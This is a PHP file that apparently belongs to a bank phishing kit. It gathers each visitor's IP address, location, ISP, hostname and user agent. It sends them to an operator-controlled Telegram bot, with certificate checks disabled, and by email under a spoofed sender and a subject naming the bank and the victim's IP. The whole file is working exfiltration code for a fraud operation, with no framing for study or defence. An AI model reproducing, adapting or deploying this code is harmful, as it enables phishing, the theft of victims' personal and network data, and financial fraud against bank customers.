<?php
$message .= " »»————- ★[DEVICE INFO]\n"."\n";
$message.= "IP Address:$ip"."\n";
$message.= "COUNTRY:$countryname"."\n";
$message.= "REGION:{$region}"."\n";
$message.= "ORGANISATION:{$isp}"."\n";
$message.= "HOSTNAME:" . $hostname . ""."\n";
$message.= "USER AGENT:{$_SERVER['HTTP_USER_AGENT']}"."\n"."\n";
error_reporting(0);
$settings = include '../settings.php';
if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}
if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: SPACE <me@me.com>\r\n";
    $subject = " $Bank By $ip";
    mail($to,$subject,$message,$headers);
}
$key = substr(sha1(mt_rand()),1,25);
$praga=rand();
$praga=md5($praga);
?>